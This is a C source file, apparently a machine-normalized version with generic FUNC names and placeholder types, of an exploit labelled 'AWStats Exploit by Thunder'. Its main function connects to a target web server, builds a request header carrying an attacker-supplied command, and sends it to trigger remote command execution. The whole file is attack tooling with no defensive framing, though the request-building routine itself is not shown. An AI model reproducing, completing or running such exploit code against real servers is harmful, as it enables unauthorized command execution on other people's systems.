#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; int /*<<< orphan*/  sin_port; } ;
struct sockaddr {int dummy; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  PF_INET ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 char* FUNC0 (char*,char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 scalar_t__ FUNC2 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int /*<<< orphan*/  FUNC7 (int,char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC8 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 

void FUNC10(char *Xhost, char *Xpath,char *Xscript, char *exeCmd, char *Xip, int Xport)
{
int sock, disp = 0, count = 0;
struct sockaddr_in sockaddrX;
char *oData, iData;

FUNC6("# AWStats Exploit by Thunder, molnar_rcs@yahoo.com\n");
sockaddrX.sin_port = FUNC4(Xport);
sockaddrX.sin_family = AF_INET;
sockaddrX.sin_addr.s_addr = FUNC5(Xip);
if(Xhost == "localhost")
{
FUNC6("# Using hardcoded (default) options, use `-u` for usage\n"
);
}
FUNC6("# Connecting to %s (%s) ...", Xhost, Xip);
sock = FUNC8(PF_INET, SOCK_STREAM, IPPROTO_TCP);
if (FUNC2(sock, (struct sockaddr*)&sockaddrX, 16) < 0)
{
FUNC6("\n# Connect to %s (%s) on port %i failed!\n", Xhost, Xip, Xport);
FUNC3(-1);
}
FUNC6("Done!\n# Building header...");
oData = FUNC0(Xhost, Xpath, Xscript, exeCmd);
FUNC6("Done!\n# Sending data...");
FUNC7(sock, oData, FUNC9(oData), 0);

/* the code below reads the server response byte by byte, this is not needed
while(read(sock, &iData, 1))
putchar(iData);
*/
FUNC6("Done!\n# Exploit finished.\n");
FUNC1(sock);
}